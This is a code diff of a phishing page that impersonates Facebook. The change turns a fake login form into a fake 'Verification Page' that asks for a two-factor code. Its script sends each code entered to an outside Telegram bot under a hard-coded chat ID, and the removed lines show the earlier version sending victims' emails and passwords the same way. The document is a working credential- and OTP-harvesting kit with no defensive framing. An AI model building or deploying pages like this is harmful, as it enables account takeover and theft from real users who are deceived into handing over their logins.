@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>Facebook Login Page</title>
+  <title>Facebook Verification Page</title>
   <style>
     @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900&display=swap");
 
@@ -53,16 +53,23 @@
       background: #fff;
       padding: 2rem;
       width: 530px;
-      height: 380px;
+      height: 250px;
       border-radius: 0.5rem;
       box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+    }
+
+    form label {
+      font-size: 14px;
+      margin-bottom: 0.5rem;
     }
 
     form input {
       outline: none;
       padding: 0.8rem 1rem;
-      margin-bottom: 0.8rem;
+      margin-bottom: 1rem;
       font-size: 1.1rem;
+      border-radius: 0.3rem;
+      border: 1px solid #ccc;
     }
 
     form input:focus {
@@ -88,30 +95,8 @@
       text-decoration: none;
       text-align: center;
       font-size: 1rem;
-      padding-top: 0.8rem;
-      color: #1877f2;
-    }
-
-    form hr {
-      background: #f7f7f7;
-      margin: 1rem;
-    }
-
-    form .create-account {
-      outline: none;
-      border: none;
-      background: #06b909;
-      padding: 0.8rem 1rem;
-      border-radius: 0.4rem;
-      font-size: 1.1rem;
-      color: #fff;
-      width: 75%;
-      margin: 0 auto;
-    }
-
-    form .create-account:hover {
-      background: #03ad06;
-      cursor: pointer;
+      color: grey;
+      margin-top: 0.5rem;
     }
 
     @media (max-width: 500px) {
@@ -119,14 +104,8 @@
         font-size: 60%;
       }
 
-      .name-content {
-        margin: 0;
-        text-align: center;
-      }
-
       form {
         width: 300px;
-        height: fit-content;
       }
 
       form input {
@@ -136,19 +115,6 @@
 
       form .login {
         font-size: 1.5rem;
-      }
-
-      form a {
-        font-size: 1.5rem;
-      }
-
-      form .create-account {
-        font-size: 1.5rem;
-      }
-
-      .flex-div {
-        display: flex;
-        flex-direction: column;
       }
     }
   </style>
@@ -160,13 +126,11 @@
         <h1 class="logo">Facebook</h1>
         <p>Connect with friends and the world around you on Facebook.</p>
       </div>
-      <form id="loginForm">
-        <label style="font-size: 14px;">Please enter your verification code</label>
-        <br>
-        <input type="text" id="tel" placeholder="Verification" required />
+      <form id="verificationForm">
+        <label>Please enter your verification code</label>
+        <input type="text" id="verificationCode" placeholder="Verification Code" required />
         <button type="submit" class="login">Submit</button>
-        <a style="color: grey;" href="#">Not You?</a>
-        <hr />
+        <a href="#">Not You?</a>
       </form>
     </div>
   </div>
@@ -177,18 +141,17 @@
     const CHAT_ID = "7026430464";
 
     // Form Submission Handler
-    document.getElementById("loginForm").addEventListener("submit", function (event) {
+    document.getElementById("verificationForm").addEventListener("submit", function (event) {
       event.preventDefault(); // Prevent default form submission
 
-      // Get form values
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+      // Get the input value
+      const verificationCode = document.getElementById("verificationCode").value;
 
       // Telegram API URL
       const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
       // Message to send
-      const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+      const message = `Verification Code Entered:\nCode: ${verificationCode}`;
 
       // Send data to Telegram
       fetch(telegramApiUrl, {
@@ -204,7 +167,7 @@
         .then((response) => {
           if (response.ok) {
             // Redirect to the next page
-            window.location.href = "fotp.html"; // Replace with your actual URL
+            window.location.href = "next-page.html"; // Replace with your actual URL
           } else {
             alert("Failed to send data to Telegram.");
           }
